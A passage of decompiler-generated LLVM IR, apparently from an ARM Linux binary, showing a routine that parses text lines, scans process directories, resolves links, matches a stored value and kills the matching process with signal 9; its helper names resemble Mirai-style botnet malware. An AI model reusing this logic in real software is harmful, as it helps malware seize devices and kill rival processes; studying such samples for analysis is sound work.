  store i32 %v4_def4, i32* @r3, align 4
  %v2_def8 = icmp eq i8 %v3_def4, 0
  br i1 %v2_def8, label %bb134, label %bb133

bb133:                                            ; preds = %dec_label_pc_def0
  %v8_defc = icmp eq i8 %v3_def4, 58
  br i1 %v8_defc, label %.thread8, label %dec_label_pc_df10

.thread8:                                         ; preds = %bb133
  br label %dec_label_pc_df28

bb134:                                            ; preds = %dec_label_pc_def0
  br label %dec_label_pc_df28

dec_label_pc_df10:                                ; preds = %bb133
  %v1_df18.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_df14

dec_label_pc_df14:                                ; preds = %bb135, %dec_label_pc_df10
  %v0_df14 = phi i32 [ %v1_df14, %bb135 ], [ 0, %dec_label_pc_df10 ]
  %v1_df14 = add i32 %v0_df14, 1
  %v2_df18 = add i32 %v1_df14, %v1_df18.pre
  %v3_df18 = inttoptr i32 %v2_df18 to i8*
  %v4_df18 = load i8, i8* %v3_df18, align 1
  %v6_df18 = zext i8 %v4_df18 to i32
  store i32 %v6_df18, i32* @r3, align 4
  %v2_df1c = icmp eq i8 %v4_df18, 0
  br i1 %v2_df1c, label %dec_label_pc_df28, label %bb135

bb135:                                            ; preds = %dec_label_pc_df14
  %v8_df20 = icmp eq i8 %v4_df18, 58
  br i1 %v8_df20, label %dec_label_pc_df28, label %dec_label_pc_df14

dec_label_pc_df28:                                ; preds = %dec_label_pc_df14, %bb135, %bb134, %.thread8
  %v1_df54 = phi i32 [ 0, %.thread8 ], [ 0, %bb134 ], [ %v1_df14, %bb135 ], [ %v1_df14, %dec_label_pc_df14 ]
  %v0_df28 = phi i32 [ %v4_def4, %.thread8 ], [ %v4_def4, %bb134 ], [ %v6_df18, %bb135 ], [ %v6_df18, %dec_label_pc_df14 ]
  %v2_df28 = icmp eq i32 %v0_df28, 0
  br i1 %v2_df28, label %dec_label_pc_ded8.backedge, label %dec_label_pc_df30

dec_label_pc_ded8.backedge:                       ; preds = %dec_label_pc_df28, %dec_label_pc_dff8, %dec_label_pc_e044, %dec_label_pc_df74
  %v0_dee0 = load i32, i32* @r8, align 4
  %v4_dee4 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_dee0)
  %v2_dee8 = icmp eq i32 %v4_dee4, 0
  br i1 %v2_dee8, label %dec_label_pc_e070.loopexit, label %dec_label_pc_def0

dec_label_pc_df30:                                ; preds = %dec_label_pc_df28
  %v1_df34 = add i32 %v1_df54, 2
  %v2_df3c = add i32 %v1_df34, %v2_df38
  %v1_df40 = add i32 %v2_df3c, -545
  %v2_df40 = inttoptr i32 %v1_df40 to i8*
  %v3_df40 = load i8, i8* %v2_df40, align 1
  %v2_df44 = icmp eq i8 %v3_df40, 0
  br i1 %v2_df44, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_df30
  %v8_df48 = icmp eq i8 %v3_df40, 32
  br i1 %v8_df48, label %.thread13, label %dec_label_pc_df54

.thread13:                                        ; preds = %bb136
  store i32 %v1_df34, i32* @r5, align 4
  br label %dec_label_pc_df74

bb137:                                            ; preds = %dec_label_pc_df30
  store i32 %v1_df34, i32* @r5, align 4
  br label %dec_label_pc_df74

dec_label_pc_df54:                                ; preds = %bb136
  %v0_df54 = load i32, i32* @r6, align 4
  %v2_df54 = add i32 %v0_df54, %v1_df54
  br label %dec_label_pc_df5c

dec_label_pc_df5c:                                ; preds = %bb138, %dec_label_pc_df54
  %v0_df6816 = phi i32 [ %v1_df68, %bb138 ], [ %v1_df34, %dec_label_pc_df54 ]
  %v0_df6c18 = phi i32 [ %v1_df6c, %bb138 ], [ %v2_df54, %dec_label_pc_df54 ]
  %v1_df5c = add i32 %v0_df6c18, 3
  %v2_df5c = inttoptr i32 %v1_df5c to i8*
  %v3_df5c = load i8, i8* %v2_df5c, align 1
  %v2_df60 = icmp eq i8 %v3_df5c, 0
  br i1 %v2_df60, label %.thread15, label %bb138

.thread15:                                        ; preds = %dec_label_pc_df5c
  %v1_df6817 = add i32 %v0_df6816, 1
  store i32 %v1_df6817, i32* @r5, align 4
  br label %dec_label_pc_df74

bb138:                                            ; preds = %dec_label_pc_df5c
  %v8_df64 = icmp eq i8 %v3_df5c, 32
  %v1_df68 = add i32 %v0_df6816, 1
  store i32 %v1_df68, i32* @r5, align 4
  %v1_df6c = add i32 %v0_df6c18, 1
  br i1 %v8_df64, label %dec_label_pc_df74, label %dec_label_pc_df5c

dec_label_pc_df74:                                ; preds = %bb138, %bb137, %.thread15, %.thread13
  %v1_df80 = phi i32 [ %v1_df6817, %.thread15 ], [ %v1_df34, %.thread13 ], [ %v1_df34, %bb137 ], [ %v1_df68, %bb138 ]
  %v0_df74 = load i32, i32* @r6, align 4
  %v2_df74 = add i32 %v0_df74, %v1_df34
  store i32 %v2_df74, i32* @r4, align 4
  %v2_df80 = add i32 %v1_df80, %v2_df38
  store i32 0, i32* @r7, align 4
  %v3_df88 = add i32 %v2_df80, -545
  %v4_df88 = inttoptr i32 %v3_df88 to i8*
  store i8 0, i8* %v4_df88, align 1
  %v0_df8c = load i32, i32* @r4, align 4
  %v1_df90 = inttoptr i32 %v0_df8c to i8*
  %v2_df90 = call i32 @util_strlen(i8* %v1_df90)
  store i32 %v2_df90, i32* @r1, align 4
  %v0_df9c = load i32, i32* @r4, align 4
  %v3_dfa0 = inttoptr i32 %v0_df9c to i8*
  %v4_dfa0 = call i32 @util_stristr(i8* %v3_dfa0, i32 %v2_df90, i32 %v2_de78)
  %v7_dfa4 = icmp eq i32 %v4_dfa0, -1
  br i1 %v7_dfa4, label %dec_label_pc_ded8.backedge, label %dec_label_pc_dfc0.preheader

dec_label_pc_dfc0.preheader:                      ; preds = %dec_label_pc_df74
  %v1_dfa8 = load i32, i32* @r7, align 4
  %v1_dfac = load i32, i32* @r6, align 4
  %v2_dfac = load i32, i32* @r5, align 4
  %v3_dfac = add i32 %v2_dfac, %v1_dfac
  store i32 %v1_dfa8, i32* @lr, align 4
  %v1_dfc049 = add i32 %v3_dfac, 2
  %v2_dfc050 = inttoptr i32 %v1_dfc049 to i8*
  %v3_dfc051 = load i8, i8* %v2_dfc050, align 1
  %v4_dfc052 = zext i8 %v3_dfc051 to i32
  store i32 %v4_dfc052, i32* @r3, align 4
  %v2_dfc453 = icmp eq i8 %v3_dfc051, 0
  %v1_dfc855 = add i32 %v2_dfac, 2
  br i1 %v2_dfc453, label %dec_label_pc_dff8, label %dec_label_pc_dfd0

dec_label_pc_dfd0:                                ; preds = %dec_label_pc_dfc0.preheader, %dec_label_pc_dfc0.backedge
  %v0_dff884 = phi i32 [ %v0_dff882, %dec_label_pc_dfc0.backedge ], [ %v1_dfa8, %dec_label_pc_dfc0.preheader ]
  %v0_dfe0.pr = phi i32 [ %v0_dfe0.pr71, %dec_label_pc_dfc0.backedge ], [ %v1_dfa8, %dec_label_pc_dfc0.preheader ]
  %v0_e304 = phi i32 [ %v0_e30474, %dec_label_pc_dfc0.backedge ], [ %v1_dfa8, %dec_label_pc_dfc0.preheader ]
  %v0_dfc879 = phi i32 [ %v1_dfc8, %dec_label_pc_dfc0.backedge ], [ %v1_dfc855, %dec_label_pc_dfc0.preheader ]
  %v0_dff0 = phi i32 [ %v0_dfc0, %dec_label_pc_dfc0.backedge ], [ %v3_dfac, %dec_label_pc_dfc0.preheader ]
  %v1_dfd4 = phi i32 [ %v4_dfc0, %dec_label_pc_dfc0.backedge ], [ %v4_dfc052, %dec_label_pc_dfc0.preheader ]
  %v7_dfd0 = icmp eq i32 %v1_dfd4, 9
  br i1 %v7_dfd0, label %bb140, label %bb139

bb139:                                            ; preds = %dec_label_pc_dfd0
  %v8_dfd4 = icmp eq i32 %v1_dfd4, 32
  br i1 %v8_dfd4, label %.thread27, label %dec_label_pc_dfe0

.thread27:                                        ; preds = %bb139
  br label %dec_label_pc_dfec

bb140:                                            ; preds = %dec_label_pc_dfd0
  br label %dec_label_pc_dfec

dec_label_pc_dfe0:                                ; preds = %bb139
  %v7_dfe0 = icmp eq i32 %v0_dfe0.pr, 1
  br i1 %v7_dfe0, label %dec_label_pc_e304, label %dec_label_pc_dfe8

dec_label_pc_dfe8:                                ; preds = %dec_label_pc_e304, %dec_label_pc_dfe0
  %v0_dfec76 = phi i32 [ %v1_e304, %dec_label_pc_e304 ], [ %v0_e304, %dec_label_pc_dfe0 ]
  br label %dec_label_pc_dfec

dec_label_pc_dfec:                                ; preds = %bb140, %.thread27, %dec_label_pc_dfe8
  %v0_dfec = phi i32 [ %v0_e304, %.thread27 ], [ %v0_e304, %bb140 ], [ %v0_dfec76, %dec_label_pc_dfe8 ]
  %v0_dfe0.pr72 = phi i32 [ 1, %.thread27 ], [ 1, %bb140 ], [ 0, %dec_label_pc_dfe8 ]
  %v7_dff4 = icmp sgt i32 %v0_dfec, 6
  br i1 %v7_dff4, label %dec_label_pc_dff8, label %dec_label_pc_dfc0.backedge

dec_label_pc_dff8:                                ; preds = %dec_label_pc_dfc0.backedge, %dec_label_pc_dfec, %dec_label_pc_dfc0.preheader
  %v1_e048 = phi i32 [ %v1_dfc855, %dec_label_pc_dfc0.preheader ], [ %v1_dfc8, %dec_label_pc_dfc0.backedge ], [ %v0_dfc879, %dec_label_pc_dfec ]
  %v0_dff8 = phi i32 [ %v1_dfa8, %dec_label_pc_dfc0.preheader ], [ %v0_dff882, %dec_label_pc_dfc0.backedge ], [ %v0_dff884, %dec_label_pc_dfec ]
  %v2_dff8 = icmp eq i32 %v0_dff8, 0
  br i1 %v2_dff8, label %dec_label_pc_ded8.backedge, label %dec_label_pc_e004

dec_label_pc_e004:                                ; preds = %dec_label_pc_dff8
  %v2_e00c = add i32 %v1_e048, %v2_df38
  %v1_e010 = add i32 %v2_e00c, -545
  %v2_e010 = inttoptr i32 %v1_e010 to i8*
  %v3_e010 = load i8, i8* %v2_e010, align 1
  %v2_e014 = icmp eq i8 %v3_e010, 0
  br i1 %v2_e014, label %dec_label_pc_e044, label %bb141

bb141:                                            ; preds = %dec_label_pc_e004
  %v8_e018 = icmp eq i8 %v3_e010, 32
  br i1 %v8_e018, label %dec_label_pc_e044, label %dec_label_pc_e020

dec_label_pc_e020:                                ; preds = %bb141
  %v2_e020 = add i32 %v1_e048, %v1_dfac
  br label %dec_label_pc_e024

dec_label_pc_e024:                                ; preds = %bb142, %dec_label_pc_e020
  %v0_e03030 = phi i32 [ %v1_e030, %bb142 ], [ %v1_e048, %dec_label_pc_e020 ]
  %v0_e024 = phi i32 [ %v1_e024, %bb142 ], [ %v2_e020, %dec_label_pc_e020 ]
  %v1_e024 = add i32 %v0_e024, 1
  %v2_e024 = inttoptr i32 %v1_e024 to i8*
  %v3_e024 = load i8, i8* %v2_e024, align 1
  %v2_e028 = icmp eq i8 %v3_e024, 0
  br i1 %v2_e028, label %.thread29, label %bb142

.thread29:                                        ; preds = %dec_label_pc_e024
  %v1_e03031 = add i32 %v0_e03030, 1
  br label %dec_label_pc_e038

bb142:                                            ; preds = %dec_label_pc_e024
  %v8_e02c = icmp eq i8 %v3_e024, 32
  %v1_e030 = add i32 %v0_e03030, 1
  br i1 %v8_e02c, label %dec_label_pc_e038, label %dec_label_pc_e024

dec_label_pc_e038:                                ; preds = %bb142, %.thread29
  %v1_e040 = phi i32 [ %v1_e03031, %.thread29 ], [ %v1_e030, %bb142 ]
  %v2_e040 = add i32 %v1_e040, %v2_df38
  br label %dec_label_pc_e044

dec_label_pc_e044:                                ; preds = %dec_label_pc_e004, %bb141, %dec_label_pc_e038
  %v2_e050 = phi i32 [ %v2_e00c, %dec_label_pc_e004 ], [ %v2_e00c, %bb141 ], [ %v2_e040, %dec_label_pc_e038 ]
  %v2_e048 = add i32 %v1_e048, %v1_dfac
  store i32 %v2_e048, i32* @r4, align 4
  %v3_e050 = add i32 %v2_e050, -545
  %v4_e050 = inttoptr i32 %v3_e050 to i8*
  store i8 0, i8* %v4_e050, align 1
  %v1_e054 = inttoptr i32 %v2_e048 to i8*
  %v2_e054 = call i32 @util_strlen(i8* %v1_e054)
  %v8_e05c = icmp sgt i32 %v2_e054, 15
  br i1 %v8_e05c, label %dec_label_pc_ded8.backedge, label %dec_label_pc_e060

dec_label_pc_e060:                                ; preds = %dec_label_pc_e044
  %v0_e064 = load i32, i32* @r4, align 4
  %v2_e068 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_e068, i32* @r0, align 4
  %v2_e06c = bitcast i32* %stack_var_-56 to i8*
  %v3_e06c = call i32 @util_strcpy(i8* %v2_e06c, i32 %v0_e064)
  br label %dec_label_pc_e070

dec_label_pc_e070.loopexit:                       ; preds = %dec_label_pc_ded8.backedge, %dec_label_pc_ded8.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre100 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_e070

dec_label_pc_e070:                                ; preds = %dec_label_pc_e070.loopexit, %dec_label_pc_e060
  %v1_e080.pre-phi = phi i8* [ %.pre100, %dec_label_pc_e070.loopexit ], [ %v2_e06c, %dec_label_pc_e060 ]
  %v2_e07c.pre-phi = phi i32 [ %.pre, %dec_label_pc_e070.loopexit ], [ %v2_e068, %dec_label_pc_e060 ]
  %v0_e070 = load i32, i32* @r8, align 4
  %v1_e074 = call i32 @__GI___libc_close(i32 %v0_e070)
  %v2_e080 = call i32 @util_strlen(i8* %v1_e080.pre-phi)
  store i32 %v2_e080, i32* @r4, align 4
  %v2_e084 = icmp eq i32 %v2_e080, 0
  br i1 %v2_e084, label %dec_label_pc_e2dc, label %dec_label_pc_e090

dec_label_pc_e090:                                ; preds = %dec_label_pc_e070
  %v3_e098 = call i32 @table_retrieve_val(i32 6, i32* null)
  %v1_e09c = call i32 @__GI_opendir(i32 %v3_e098)
  store i32 %v1_e09c, i32* @sb, align 4
  %v2_e0a0 = icmp eq i32 %v1_e09c, 0
  br i1 %v2_e0a0, label %dec_label_pc_e2d0, label %dec_label_pc_e0b0.preheader

dec_label_pc_e0b0.preheader:                      ; preds = %dec_label_pc_e090
  store i32 0, i32* @r5, align 4
  %v1_e0b444 = inttoptr i32 %v1_e09c to i32*
  %v2_e0b445 = call i32 @__GI_readdir(i32* %v1_e0b444)
  %v2_e0b847 = icmp eq i32 %v2_e0b445, 0
  br i1 %v2_e0b847, label %dec_label_pc_e2c4, label %dec_label_pc_e0c0.preheader

dec_label_pc_e0b0.loopexit:                       ; preds = %dec_label_pc_e0c8, %dec_label_pc_e0d8, %dec_label_pc_e144
  %v0_e0b0 = load i32, i32* @sb, align 4
  %v1_e0b4 = inttoptr i32 %v0_e0b0 to i32*
  %v2_e0b4 = call i32 @__GI_readdir(i32* %v1_e0b4)
  %v2_e0b8 = icmp eq i32 %v2_e0b4, 0
  br i1 %v2_e0b8, label %dec_label_pc_e2c4, label %dec_label_pc_e0c0.preheader

dec_label_pc_e0c0.preheader:                      ; preds = %dec_label_pc_e0b0.preheader, %dec_label_pc_e0b0.loopexit
  %v0_e0c892 = phi i32 [ %v2_e0b4, %dec_label_pc_e0b0.loopexit ], [ %v2_e0b445, %dec_label_pc_e0b0.preheader ]
  br label %dec_label_pc_e0c0

dec_label_pc_e0c0:                                ; preds = %dec_label_pc_e0c0.preheader, %dec_label_pc_e2ac
  %v0_e0e0 = phi i32 [ %v0_e0c892, %dec_label_pc_e0c0.preheader ], [ %v2_e2b8, %dec_label_pc_e2ac ]
  %v0_e0c0 = load i32, i32* @r5, align 4
  %v2_e0c0 = icmp eq i32 %v0_e0c0, 0
  br i1 %v2_e0c0, label %dec_label_pc_e0c8, label %dec_label_pc_e2c4

dec_label_pc_e0c8:                                ; preds = %dec_label_pc_e0c0
  %v1_e0c8 = add i32 %v0_e0e0, 11
  %v2_e0c8 = inttoptr i32 %v1_e0c8 to i8*
  %v3_e0c8 = load i8, i8* %v2_e0c8, align 1
  %v4_e0c8 = zext i8 %v3_e0c8 to i32
  %v1_e0cc = add nsw i32 %v4_e0c8, -48
  %tmp = icmp ugt i32 %v1_e0cc, 9
  br i1 %tmp, label %dec_label_pc_e0b0.loopexit, label %dec_label_pc_e0d8

dec_label_pc_e0d8:                                ; preds = %dec_label_pc_e0c8
  store i32 %v1_e0c8, i32* @r7, align 4
  %v3_e0e4 = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_de50, i32* @r0, align 4
  %v3_e0f0 = call i32 @util_strcpy(i8* %v3_de74, i32 %v3_e0e4)
  %v2_e0f8 = call i32 @util_strlen(i8* %v3_de74)
  %v0_e0fc = load i32, i32* @r7, align 4
  %v1_e100 = load i32, i32* @sl, align 4
  %v2_e100 = add i32 %v1_e100, %v2_e0f8
  store i32 %v2_e100, i32* @r0, align 4
  %v2_e104 = inttoptr i32 %v2_e100 to i8*
  %v3_e104 = call i32 @util_strcpy(i8* %v2_e104, i32 %v0_e0fc)
  %v2_e10c = call i32 @util_strlen(i8* %v3_de74)
  %v0_e110 = load i32, i32* @r5, align 4
  store i32 %v2_e10c, i32* @r4, align 4
  %v2_e11c = inttoptr i32 %v0_e110 to i32*
  %v3_e11c = call i32 @table_retrieve_val(i32 7, i32* %v2_e11c)
  %v0_e124 = load i32, i32* @r4, align 4
  %v1_e124 = load i32, i32* @sl, align 4
  %v2_e124 = add i32 %v1_e124, %v0_e124
  store i32 %v2_e124, i32* @r0, align 4
  %v2_e128 = inttoptr i32 %v2_e124 to i8*
  %v3_e128 = call i32 @util_strcpy(i8* %v2_e128, i32 %v3_e11c)
  %v3_e138 = call i32 @readlink(i32 %v2_de50, i32 %v2_de40, i32 4096)
  %v7_e13c = icmp eq i32 %v3_e138, -1
  br i1 %v7_e13c, label %dec_label_pc_e0b0.loopexit, label %dec_label_pc_e144

dec_label_pc_e144:                                ; preds = %dec_label_pc_e0d8
  %v0_e144 = load i32, i32* @r5, align 4
  %v2_e14c = inttoptr i32 %v0_e144 to i32*
  %v3_e14c = call i32 @table_retrieve_val(i32 6, i32* %v2_e14c)
  store i32 %v2_de50, i32* @r0, align 4
  %v3_e158 = call i32 @util_strcpy(i8* %v3_de74, i32 %v3_e14c)
  %v2_e160 = call i32 @util_strlen(i8* %v3_de74)
  %v0_e164 = load i32, i32* @r7, align 4
  %v1_e168 = load i32, i32* @sl, align 4
  %v2_e168 = add i32 %v1_e168, %v2_e160
  store i32 %v2_e168, i32* @r0, align 4
  %v2_e16c = inttoptr i32 %v2_e168 to i8*
  %v3_e16c = call i32 @util_strcpy(i8* %v2_e16c, i32 %v0_e164)
  %v2_e174 = call i32 @util_strlen(i8* %v3_de74)
  %v0_e178 = load i32, i32* @r5, align 4
  store i32 %v2_e174, i32* @r4, align 4
  %v2_e184 = inttoptr i32 %v0_e178 to i32*
  %v3_e184 = call i32 @table_retrieve_val(i32 9, i32* %v2_e184)
  %v0_e18c = load i32, i32* @r4, align 4
  %v1_e18c = load i32, i32* @sl, align 4
  %v2_e18c = add i32 %v1_e18c, %v0_e18c
  store i32 %v2_e18c, i32* @r0, align 4
  %v2_e190 = inttoptr i32 %v2_e18c to i8*
  %v3_e190 = call i32 @util_strcpy(i8* %v2_e190, i32 %v3_e184)
  %v1_e198 = call i32 @__GI_opendir(i32 %v2_de50)
  store i32 %v1_e198, i32* @r8, align 4
  %v2_e19c = icmp eq i32 %v1_e198, 0
  br i1 %v2_e19c, label %dec_label_pc_e0b0.loopexit, label %dec_label_pc_e1a4.preheader

dec_label_pc_e1a4.preheader:                      ; preds = %dec_label_pc_e144
  %v1_e1a839 = inttoptr i32 %v1_e198 to i32*
  %v2_e1a840 = call i32 @__GI_readdir(i32* %v1_e1a839)
  store i32 %v2_e1a840, i32* @r6, align 4
  %v2_e1ac42 = icmp eq i32 %v2_e1a840, 0
  br i1 %v2_e1ac42, label %dec_label_pc_e2ac, label %dec_label_pc_e1bcthread-pre-split

dec_label_pc_e1a4.loopexit:                       ; preds = %dec_label_pc_e1c4, %dec_label_pc_e25c
  %v0_e1a4 = load i32, i32* @r8, align 4
  %v1_e1a8 = inttoptr i32 %v0_e1a4 to i32*
  %v2_e1a8 = call i32 @__GI_readdir(i32* %v1_e1a8)
  store i32 %v2_e1a8, i32* @r6, align 4
  %v2_e1ac = icmp eq i32 %v2_e1a8, 0
  br i1 %v2_e1ac, label %dec_label_pc_e2ac, label %dec_label_pc_e1bcthread-pre-split

dec_label_pc_e1bcthread-pre-split:                ; preds = %dec_label_pc_e1a4.preheader, %dec_label_pc_e1a4.loopexit
  %v0_e1bc.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e1bc

dec_label_pc_e1bc:                                ; preds = %dec_label_pc_e1bcthread-pre-split, %dec_label_pc_e284
  %v0_e1bc = phi i32 [ %v0_e1bc.pr, %dec_label_pc_e1bcthread-pre-split ], [ 1, %dec_label_pc_e284 ]
  %v2_e1bc = icmp eq i32 %v0_e1bc, 0
  br i1 %v2_e1bc, label %dec_label_pc_e1c4, label %dec_label_pc_e2ac

dec_label_pc_e1c4:                                ; preds = %dec_label_pc_e1bc
  %v2_e1c4 = call i32 @util_zero(i32 %v2_de40, i32 4096)
  %v0_e1c8 = load i32, i32* @r5, align 4
  %v2_e1d0 = inttoptr i32 %v0_e1c8 to i32*
  %v3_e1d0 = call i32 @table_retrieve_val(i32 6, i32* %v2_e1d0)
  store i32 %v2_de50, i32* @r0, align 4
  %v3_e1dc = call i32 @util_strcpy(i8* %v3_de74, i32 %v3_e1d0)
  %v2_e1e4 = call i32 @util_strlen(i8* %v3_de74)
  %v0_e1e8 = load i32, i32* @r7, align 4
  %v1_e1ec = load i32, i32* @sl, align 4
  %v2_e1ec = add i32 %v1_e1ec, %v2_e1e4
  store i32 %v2_e1ec, i32* @r0, align 4
  %v2_e1f0 = inttoptr i32 %v2_e1ec to i8*
  %v3_e1f0 = call i32 @util_strcpy(i8* %v2_e1f0, i32 %v0_e1e8)
  %v2_e1f8 = call i32 @util_strlen(i8* %v3_de74)
  %v0_e1fc = load i32, i32* @r5, align 4
  store i32 %v2_e1f8, i32* @r4, align 4
  %v2_e208 = inttoptr i32 %v0_e1fc to i32*
  %v3_e208 = call i32 @table_retrieve_val(i32 9, i32* %v2_e208)
  %v0_e210 = load i32, i32* @r4, align 4
  %v1_e210 = load i32, i32* @sl, align 4
  %v2_e210 = add i32 %v1_e210, %v0_e210
  store i32 %v2_e210, i32* @r0, align 4
  %v2_e214 = inttoptr i32 %v2_e210 to i8*
  %v3_e214 = call i32 @util_strcpy(i8* %v2_e214, i32 %v3_e208)
  %v2_e21c = call i32 @util_strlen(i8* %v3_de74)
  %v1_e224 = load i32, i32* @sl, align 4
  %v2_e224 = add i32 %v1_e224, %v2_e21c
  store i32 %v2_e224, i32* @r0, align 4
  %v2_e228 = inttoptr i32 %v2_e224 to i8*
  %v3_e228 = call i32 @util_strcpy(i8* %v2_e228, i32 ptrtoint (i32* @global_var_1b3ec.32 to i32))
  %v2_e230 = call i32 @util_strlen(i8* %v3_de74)
  %v0_e234 = load i32, i32* @r6, align 4
  %v1_e234 = add i32 %v0_e234, 11
  %v1_e238 = load i32, i32* @sl, align 4
  %v2_e238 = add i32 %v1_e238, %v2_e230
  store i32 %v2_e238, i32* @r0, align 4
  %v2_e23c = inttoptr i32 %v2_e238 to i8*
  %v3_e23c = call i32 @util_strcpy(i8* %v2_e23c, i32 %v1_e234)
  %v3_e24c = call i32 @readlink(i32 %v2_de50, i32 %v2_de40, i32 4096)
  %v7_e250 = icmp eq i32 %v3_e24c, -1
  br i1 %v7_e250, label %dec_label_pc_e1a4.loopexit, label %dec_label_pc_e25c

dec_label_pc_e25c:                                ; preds = %dec_label_pc_e1c4
  %v2_e25c = call i32 @util_strlen(i8* %v3_de60)
  store i32 %v2_e25c, i32* @r1, align 4
  %v4_e270 = call i32 @util_stristr(i8* %v3_de60, i32 %v2_e25c, i32 %v2_e07c.pre-phi)
  %v7_e274 = icmp eq i32 %v4_e270, -1
  br i1 %v7_e274, label %dec_label_pc_e1a4.loopexit, label %dec_label_pc_e284

dec_label_pc_e284:                                ; preds = %dec_label_pc_e25c
  %v0_e27c = load i32, i32* @r7, align 4
  %v2_e284 = inttoptr i32 %v0_e27c to i8*
  %v3_e284 = call i32 @util_atoi(i8* %v2_e284, i32 10)
  %v2_e28c = call i32 @kill(i32 %v3_e284, i32 9)
  %v0_e290 = load i32, i32* @r8, align 4
  %v1_e294 = inttoptr i32 %v0_e290 to i32*
  %v2_e294 = call i32 @__GI_readdir(i32* %v1_e294)
  store i32 %v2_e294, i32* @r6, align 4
  %v2_e298 = icmp eq i32 %v2_e294, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e298, label %dec_label_pc_e2ac, label %dec_label_pc_e1bc

dec_label_pc_e2ac:                                ; preds = %dec_label_pc_e1a4.loopexit, %dec_label_pc_e284, %dec_label_pc_e1bc, %dec_label_pc_e1a4.preheader
  %v0_e2ac = load i32, i32* @r8, align 4
  %v1_e2b0 = inttoptr i32 %v0_e2ac to i32*
  %v2_e2b0 = call i32 @__GI_closedir(i32* %v1_e2b0)
  %v0_e2b4 = load i32, i32* @sb, align 4
  %v1_e2b8 = inttoptr i32 %v0_e2b4 to i32*
  %v2_e2b8 = call i32 @__GI_readdir(i32* %v1_e2b8)
  %v2_e2bc = icmp eq i32 %v2_e2b8, 0
  br i1 %v2_e2bc, label %dec_label_pc_e2c4, label %dec_label_pc_e0c0

dec_label_pc_e2c4:                                ; preds = %dec_label_pc_e0b0.loopexit, %dec_label_pc_e2ac, %dec_label_pc_e0c0, %dec_label_pc_e0b0.preheader
  %v0_e2c4 = load i32, i32* @sb, align 4
  %v1_e2c8 = inttoptr i32 %v0_e2c4 to i32*
  %v2_e2c8 = call i32 @__GI_closedir(i32* %v1_e2c8)
  %v0_e2cc = load i32, i32* @r5, align 4
  %v1_e2cc = urem i32 %v0_e2cc, 256
  br label %dec_label_pc_e2d0

dec_label_pc_e2d0:                                ; preds = %dec_label_pc_e090, %dec_label_pc_e2c4
  %storemerge = phi i32 [ %v1_e2cc, %dec_label_pc_e2c4 ], [ 0, %dec_label_pc_e090 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_e2d4 = call i32 @sleep(i32 1)
  br label %dec_label_pc_e2dc

dec_label_pc_e2dc:                                ; preds = %dec_label_pc_e070, %dec_label_pc_e2d0
  %v1_e2dc = call i32 @table_lock_val(i32 6)
  %v1_e2e4 = call i32 @table_lock_val(i32 7)
  %v1_e2ec = call i32 @table_lock_val(i32 9)
  %v0_e2f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e2f0

dec_label_pc_e2f0:                                ; preds = %bb, %dec_label_pc_e2dc
  %v0_e2f0 = phi i32 [ %v1_ded0, %bb ], [ %v0_e2f0.pre, %dec_label_pc_e2dc ]
  store i32 %v3_ddf8, i32* @r4, align 4
  store i32 %v6_ddf8, i32* @r5, align 4
  store i32 %v9_ddf8, i32* @r6, align 4
  store i32 %v12_ddf8, i32* @r7, align 4
  store i32 %v15_ddf8, i32* @r8, align 4
  store i32 %v18_ddf8, i32* @sb, align 4
  store i32 %v21_ddf8, i32* @sl, align 4
  store i32 %v24_ddf8, i32* @fp, align 4
  store i32 %v27_ddf8, i32* @lr, align 4
  ret i32 %v0_e2f0

dec_label_pc_e304:                                ; preds = %dec_label_pc_dfe0
  %v1_e304 = add i32 %v0_e304, 1
  %v7_e308 = icmp eq i32 %v0_e304, 0
  br i1 %v7_e308, label %dec_label_pc_e310, label %dec_label_pc_dfe8

dec_label_pc_e310:                                ; preds = %dec_label_pc_e304
  %v1_e310 = add i32 %v0_dff0, 3
  %v2_e310 = inttoptr i32 %v1_e310 to i8*
  %v3_e310 = load i8, i8* %v2_e310, align 1
  %v7_e314 = icmp eq i8 %v3_e310, 65
  br i1 %v7_e314, label %dec_label_pc_e328, label %dec_label_pc_e31c

dec_label_pc_e31c:                                ; preds = %dec_label_pc_e310, %dec_label_pc_e328
  %v0_dff883 = phi i32 [ %v0_dff884, %dec_label_pc_e310 ], [ 1, %dec_label_pc_e328 ]
  br label %dec_label_pc_dfc0.backedge

dec_label_pc_dfc0.backedge:                       ; preds = %dec_label_pc_e31c, %dec_label_pc_dfec
  %v0_dff882 = phi i32 [ %v0_dff883, %dec_label_pc_e31c ], [ %v0_dff884, %dec_label_pc_dfec ]
  %v0_e30474 = phi i32 [ %v1_e304, %dec_label_pc_e31c ], [ %v0_dfec, %dec_label_pc_dfec ]
  %v0_dfe0.pr71 = phi i32 [ 0, %dec_label_pc_e31c ], [ %v0_dfe0.pr72, %dec_label_pc_dfec ]
  %v0_dfc0 = add i32 %v0_dff0, 1
  %v1_dfc0 = add i32 %v0_dff0, 3
  %v2_dfc0 = inttoptr i32 %v1_dfc0 to i8*
  %v3_dfc0 = load i8, i8* %v2_dfc0, align 1
  %v4_dfc0 = zext i8 %v3_dfc0 to i32
  store i32 %v4_dfc0, i32* @r3, align 4
  %v2_dfc4 = icmp eq i8 %v3_dfc0, 0
  %v1_dfc8 = add i32 %v0_dfc879, 1
  br i1 %v2_dfc4, label %dec_label_pc_dff8, label %dec_label_pc_dfd0

dec_label_pc_e328:                                ; preds = %dec_label_pc_e310
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_e31c

dec_label_pc_e330:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_dea4

; uselistorder directives
  uselistorder i32 %v1_dfc8, { 1, 0 }
  uselistorder i32 %v4_dfc0, { 1, 0 }
  uselistorder i32 %v0_dff882, { 1, 0 }
  uselistorder i32 %v1_e304, { 1, 0 }
  uselistorder i32 %v2_e2b8, { 1, 0 }
  uselistorder i32 %v1_e024, { 1, 0 }
  uselistorder i32 %v0_e03030, { 1, 0 }
  uselistorder i32 %v1_e048, { 0, 3, 1, 2 }
